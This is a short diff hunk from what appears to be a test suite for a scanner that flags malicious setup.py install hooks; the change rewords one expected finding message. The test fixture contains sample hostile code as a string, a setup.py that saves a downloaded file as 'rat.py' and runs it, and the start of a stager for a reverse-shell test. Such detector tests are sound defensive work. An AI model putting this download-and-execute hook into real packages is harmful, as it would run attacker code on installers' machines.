@@ -41,7 +41,7 @@ class SetupPyTests(unittest.TestCase):
                                        "        with open('rat.py', 'wb') as f:\n            f.write(r.content)\n"
                                        "        subprocess.check_call([sys.executable, 'rat.py'])\n" + SETUP)})
         self.assertEqual(hooks(res), [("setup.py", "CRITICAL", "setup.py runs when pip builds or installs this sdist, "
-                                       "and it downloads a file and then runs it.")])
+                                       "and it downloads a script and runs it with Python.")])
 
     def test_a_stager_and_a_reverse_shell(self):
         stager = ('import tempfile, os, sys\nt = tempfile.NamedTemporaryFile(delete=False)\n'
